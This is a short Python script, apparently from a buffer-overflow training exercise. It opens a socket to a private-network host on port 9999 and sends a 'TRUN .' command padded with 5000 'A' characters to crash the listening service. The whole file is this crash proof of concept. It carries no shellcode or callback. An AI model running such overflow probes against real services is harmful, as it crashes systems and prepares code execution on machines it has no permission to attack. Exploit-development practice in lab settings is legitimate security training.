#!/usr/bin/python
import socket

buffstring = "A"*5000

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.19.130', 9999))
s.recv(50)
s.send('TRUN .' + buffstring)
s.close()
